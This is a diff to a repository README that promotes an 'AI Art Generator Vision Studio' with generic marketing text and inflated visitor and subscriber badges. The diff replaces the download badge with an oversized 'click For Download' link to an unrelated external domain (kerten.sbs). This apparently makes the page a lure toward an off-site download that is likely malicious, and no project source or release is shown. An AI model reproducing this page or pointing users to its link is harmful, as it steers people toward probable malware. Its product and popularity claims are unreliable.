@@ -2,13 +2,19 @@
 
 AI Art Generator Vision Studio is a powerful creative tool that uses artificial intelligence to transform your ideas into breathtaking digital artworks. Just type a text prompt, choose your desired style, and let the advanced neural engine generate stunning visuals in seconds. Whether you're a designer, marketer, game developer, or just exploring your imagination — this tool brings your vision to life. Built on state-of-the-art diffusion models, it supports ultra-high resolution, multiple artistic filters, and full prompt customization. With fast rendering and minimal setup, it's your go-to AI art companion.
 
-<div style="text-align: center">
-  <a href="https://ai-art-generator-vision.github.io/.github/">
-    <img class="bumbum" style="width: 600px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-AI_Art_Generator-blueviolet">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
+
+
 
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)
 
